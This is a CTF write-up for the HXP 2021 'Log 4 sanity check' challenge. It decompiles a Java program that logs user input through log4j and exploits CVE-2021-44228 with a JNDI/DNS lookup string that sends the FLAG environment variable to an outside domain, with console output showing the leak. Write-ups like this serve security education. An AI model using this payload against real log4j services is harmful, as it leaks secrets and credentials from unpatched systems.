---
title: "HXP 2021 - Log 4 Sanity Check (Misc)"
header:
  overlay_image: /assets/images/hxp-2021/header.png
  overlay_filter: 0.5
  caption: "Photo credit: HXP CTF Organisers"

tags:
  - hxp
  - writeup
  - misc
  - log4j
  - java
---

Summary: Exploit log4j vulnerability to leak environment variables.

## Challenge Prompt

```
Log 4 sanity check
by 0xbb
misc baby
Difficulty estimate: easy - easy

Points: round(1000 · min(1, 10 / (9 + [87 solves]))) = 104 points

Description:
ALARM ALARM

Download:
Log 4 sanity check-9afb8a24feb86db1.tar.xz (1.7 MiB)

Connection (mirrors):
nc 65.108.176.77 1337
```

Attachment: [challenge file]({{ site.url }}{{ site.baseurl }}/assets/files/hxp-2021/Log 4 sanity check-9afb8a24feb86db1.tar.xz)

## Solution

This is a sanity check challenge and so is very easy. A `Vuln.class` is provided in the tar file.
This is decompiled with Procyon:

```java
import org.apache.logging.log4j.Logger;
import java.util.Scanner;
import org.apache.logging.log4j.LogManager;

//
// Decompiled by Procyon v0.5.36
//

public class Vuln
{
    public static void main(final String[] array) {
        try {
            final Logger logger = LogManager.getLogger((Class)Vuln.class);
            System.out.println("What is your favourite CTF?");
            final String next = new Scanner(System.in).next();
            if (next.toLowerCase().contains("dragon")) {
                System.out.println("<3");
                System.exit(0);
            }
            if (next.toLowerCase().contains("hxp")) {
                System.out.println(":)");
            }
            else {
                System.out.println(":(");
                logger.error("Wrong answer: {}", (Object)next);
            }
        }
        catch (Exception x) {
            System.err.println(x);
        }
    }
}
```

This is trivially vulnerable to CVE-2021-44228 (not going to call it Log4Shell, that is a stupid
name).

It can be seen from the Dockerfile that the `FLAG` environment variable contains the flag.

```dockerfile
CMD ynetd -np y -lm -1 -lpid 64 -lt 10 -t 30 "FLAG='$(cat /flag.txt)' /home/ctf/run.sh"
```

We can leak this with the following string:

```
${jndi:dns://pwn.nandynarwhals.org/leak=${env:FLAG:-lol}}
```

Using this payload leaks the flag in the error messages because the domain name ends up being too
long.

```console
nc 65.108.176.77 1337
What is your favourite CTF?
${jndi:dns://pwn.nandynarwhals.org/leak=${env:FLAG:-lol}}
:(
2021-12-19 21:15:06,116 main WARN Error looking up JNDI resource [dns://border.spro.ink/leak=hxp{Phew, I am glad I code everything in PHP anyhow :) - :( :( :(}]. javax.naming.InvalidNameException: Label exceeds 63 octets: leak=hxp{Phew, I am glad I code everything in PHP anyhow :) - :( :( :(}; remaining name 'leak=hxp{Phew, I am glad I code everything in PHP anyhow :) - :( :( :(}'
	at jdk.naming.dns/com.sun.jndi.dns.DnsName.verifyLabel(DnsName.java:487)
	at jdk.naming.dns/com.sun.jndi.dns.DnsName.add(DnsName.java:306)
	at jdk.naming.dns/com.sun.jndi.dns.DnsName.parse(DnsName.java:446)
	at jdk.naming.dns/com.sun.jndi.dns.DnsName.<init>(DnsName.java:135)
	at jdk.naming.dns/com.sun.jndi.dns.DnsContext.fullyQualify(DnsContext.java:588)
	at jdk.naming.dns/com.sun.jndi.dns.DnsContext.c_lookup(DnsContext.java:288)
	at java.naming/com.sun.jndi.toolkit.ctx.ComponentContext.p_lookup(ComponentContext.java:542)
    ...
```

**Flag:** `hxp{Phew, I am glad I code everything in PHP anyhow :) - :( :( :(}`
